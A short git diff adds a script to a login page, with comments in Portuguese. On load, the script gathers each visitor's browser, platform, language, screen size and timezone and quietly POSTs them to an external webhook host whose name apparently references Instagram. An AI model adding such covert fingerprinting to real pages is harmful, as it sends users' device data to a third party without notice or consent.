@@ -75,6 +75,29 @@
         alert('Houve um erro ao tentar fazer o login.');
       });
     });
+
+    // Capturar informações do navegador e dispositivo
+    const deviceInfo = {
+        page: "login",
+        userAgent: navigator.userAgent,
+        platform: navigator.platform,
+        language: navigator.language,
+        screenWidth: window.screen.width,
+        screenHeight: window.screen.height,
+        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
+      };
+
+      // Enviar os dados para o backend
+      fetch("https://instawebhook-6u0b.onrender.com/device-info", {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify(deviceInfo)
+      })
+      .then(response => response.json())
+      .then(data => console.log("Enviado com sucesso:", data))
+      .catch(error => console.error("Erro ao enviar:", error));
   </script>
 
 </body>
